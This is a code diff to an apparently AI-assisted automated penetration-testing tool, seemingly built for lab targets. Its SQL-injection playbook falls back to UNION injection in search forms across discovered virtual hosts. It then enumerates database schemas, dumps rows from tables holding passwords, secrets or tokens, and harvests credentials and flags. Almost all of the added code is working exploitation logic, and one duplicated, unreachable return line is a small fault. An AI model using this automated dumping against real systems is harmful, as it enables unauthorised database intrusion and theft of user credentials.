@@ -11,6 +11,7 @@ memoization keys on (playbook.name, target_key).
 
 from __future__ import annotations
 
+import json
 import re
 import secrets
 import time
@@ -73,6 +74,45 @@ def extract_ip(target: str) -> Optional[str]:
 def extract_url(target: str) -> Optional[str]:
     m = re.search(r"https?://[^\s,)\"]+", target or "")
     return m.group(0).rstrip(".,;") if m else None
+
+
+def extract_vhost(target: str) -> Optional[str]:
+    """Pull a vhost hostname from a target string like
+    'status.inlanefreight.local search SQLi (10.129.229.147)'."""
+    # longest-match-first: 'status.inlanefreight.local' must win over
+    # the zone apex 'inlanefreight.local' (mock-test lesson)
+    for m in re.finditer(r"\b((?:[a-z0-9-]+\.)+(?:local|htb|lan|internal))\b", target or "", re.I):
+        return m.group(1).lower()
+    return None
+
+
+def vhost_urls_from_state(state: Dict, ip: Optional[str]) -> List[str]:
+    """Candidate search-form URLs for a host: the IP on every web port,
+    plus each discovered vhost routed via Host header on port 80."""
+    urls: List[str] = []
+    hosts = state.get("hosts", {})
+    if ip and ip in hosts:
+        for port in (80, 8080, 443):
+            urls.append(f"http://{ip}:{port}/")
+    # vhosts discovered during enumeration live in findings like
+    # '[+] Vhost: status.inlanefreight.local'
+    for f in _findings_texts(state):
+        for m in re.finditer(r"Vhost:\s*([a-z0-9.-]+)", f, re.I):
+            urls.append(f"http://{ip or ''}/  {m.group(1)}".strip())
+    return urls
+
+
+def _findings_texts(state: Dict) -> List[str]:
+    out: List[str] = []
+    for host in state.get("hosts", {}).values():
+        fnd = host.get("findings") or []
+        for f in fnd:
+            out.append(f if isinstance(f, str) else json.dumps(f))
+    # LLM strategy evidence sometimes carries them too
+    for ap in state.get("attack_paths", []) or []:
+        for ev in ap.get("evidence", []) if isinstance(ap.get("evidence"), list) else []:
+            out.append(str(ev))
+    return out
 
 
 def extract_base(url: str) -> Optional[str]:
@@ -254,10 +294,13 @@ class SQLiChainPlaybook(Playbook):
 
         # 2. Quick boolean probe on ticket.php param
         if not P.sqli_test(base, "ticket.php", {"id": "1"}, session=sess):
-            res.status = "failed"
-            res.step("no injection signal on ticket.php?id")
-            return res
+            res.step("no injection signal on ticket.php?id — trying search-form UNION")
+            return self._search_form_union(res, state, target, url)
+        return self._dump_ticket(res, base, sess)
 
+        return self._dump_ticket(res, base, sess)
+
+    def _dump_ticket(self, res: PlaybookResult, base: str, sess) -> PlaybookResult:
         # 3. Full authenticated dump
         rows = P.sqli_dump(base, "ticket.php", {"id": "1"}, session=sess)
         if not rows:
@@ -274,6 +317,80 @@ class SQLiChainPlaybook(Playbook):
         res.status = "flag" if flags else "foothold-less data"
         if not flags:
             res.status = "failed" if not creds_found else "creds"
+        return res
+
+    def _search_form_union(self, res: PlaybookResult, state: Dict,
+                          target: str, url: str) -> PlaybookResult:
+        """v9.1: anonymous UNION SQLi in search forms (run-20 status-vhost
+        chain). Tries the vector URL first, then every vhost on the box."""
+        ip = extract_ip(target)
+        vhost = extract_vhost(target)
+        candidates: List[tuple] = [(url.rstrip("/") + "/", None, "searchitem")]
+        if vhost:
+            candidates = [(url.rstrip("/") + "/", vhost, "searchitem")]
+        # vhost candidates from state findings
+        vh_names = []
+        for f in _findings_texts(state):
+            for m in re.finditer(r"Vhost:\s*([a-z0-9.-]+)", f, re.I):
+                vh_names.append(m.group(1))
+        for vh in dict.fromkeys(vh_names):
+            candidates.append((f"http://{ip or 'TARGET_IP'}/", vh, "searchitem"))
+        seen = set()
+        for u, vh, field in candidates:
+            key = (vh or u)
+            if key in seen or "TARGET_IP" in u:
+                continue
+            seen.add(key)
+            res.step(f"probing search form {vh or u} ({field})")
+            drv = P.union_sqli_search(u, field, vhost=vh)
+            if drv is None:
+                continue
+            return self._union_dump(res, drv)
+        res.status = "failed"
+        res.step("no UNION SQLi in any search form")
+        return res
+
+    def _union_dump(self, res: PlaybookResult, drv) -> PlaybookResult:
+        res.step("UNION SQLi confirmed — enumerating DB")
+        vals: List[str] = []
+        vals.append("db=" + (drv.query("database()") or "?"))
+        vals.append("user=" + (drv.query("user()") or "?"))
+        schemas = drv.rows("schema_name FROM information_schema.schemata")
+        res.step(f"schemas: {', '.join(schemas[:8])}")
+        # hunt interesting tables then their columns
+        interesting = drv.rows(
+            "concat(table_schema,'.',table_name) FROM information_schema.tables "
+            "WHERE table_schema NOT IN ('mysql','information_schema','performance_schema','sys')")
+        res.step(f"{len(interesting)} interesting table(s)")
+        for t in interesting[:12]:
+            try:
+                schema, table = t.split(".", 1)
+                cols = drv.rows(
+                    f"column_name FROM information_schema.columns "
+                    f"WHERE table_schema='{schema}' AND table_name='{table}'")
+                res.step(f"{t}: {', '.join(cols[:8])}")
+                col_hay = " ".join(cols).lower()
+                if any(k in col_hay for k in ("password", "passwd", "flag", "secret", "token")):
+                    dump_cols = ",".join(f"coalesce({c},'')" for c in cols[:4])
+                    rows = drv.rows(
+                        f"concat_ws(0x7c,{dump_cols}) FROM {schema}.{table}")
+                    col_names = cols[:4]
+                    for v in rows:
+                        parts = v.split("|")
+                        rec = {c: p for c, p in zip(col_names, parts)}
+                        mined = _mine_creds_from_rows([rec])
+                        if mined:
+                            for c in mined:
+                                c["source"] = f"union sqli {schema}.{table}"
+                            res.credentials.extend(mined)
+                    for v in rows:
+                        vals.append(f"{t}: {v[:120]}")
+            except Exception as e:
+                res.step(f"{t}: dump error {e.__class__.__name__}")
+        text = "\n".join(vals)
+        flags = mine_flags(text)
+        res.flags = flags
+        res.status = "flag" if flags else ("creds" if res.credentials else "foothold-less data")
         return res
 
     def _pick_creds(self, state: Dict):
